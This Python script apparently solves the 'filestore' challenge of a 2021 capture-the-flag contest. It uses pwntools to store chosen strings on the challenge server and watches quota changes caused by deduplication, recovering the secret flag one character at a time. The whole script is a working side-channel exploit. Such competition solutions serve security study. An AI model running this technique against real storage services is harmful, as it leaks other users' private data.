#!/usr/bin/env python3
# MIT License
# 
# Copyright (c) 2021 Aaron Lindsey
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from pwn import *

context.log_level = 'error'

def login():
    if "REMOTE" in os.environ:
        p = remote("filestore.2021.ctfcompetition.com", 1337)
    else:
        p = process("./filestore.py")
    p.recvuntil("Menu:")
    return p

def current_used(p):
    p.sendline("status")
    status = p.recvuntilS("Menu:")
    i = status.find("Quota: ") + 7
    return float(status[i:i+5])

def store(p, s):
    p.sendline("store")
    p.recvuntil("Send me a line of data")
    p.sendline(s)
    p.recvuntil("Menu:")

print("Finding the characters used in the flag...")
p = login()
used = current_used(p)
found = []
for c in string.ascii_letters+string.digits+string.punctuation:
    store(p, c)
    new_used = current_used(p)
    if used != new_used:
        used = new_used
    else:
        found.append(c)
print(found)
p.close()

print()
print("Finding the left part of the flag...")

left_part = "CTF{"
while len(left_part) < 16:
    p = login()
    used = current_used(p)
    for c in found:
        store(p, left_part+c)
        new_used = current_used(p)
        if used != new_used:
            used = new_used
        else:
            left_part += c
            print(left_part)
            break
    p.close()

print()
print("Finding the right part of the flag...")

right_part = "}"
while len(right_part) < 11:
    p = login()
    used = current_used(p)
    for c in found:
        store(p, c+right_part)
        new_used = current_used(p)
        if used != new_used:
            used = new_used
        else:
            right_part = c + right_part
            print(right_part)
            break
    p.close()

print()
print("Flag:")
print(left_part+right_part)

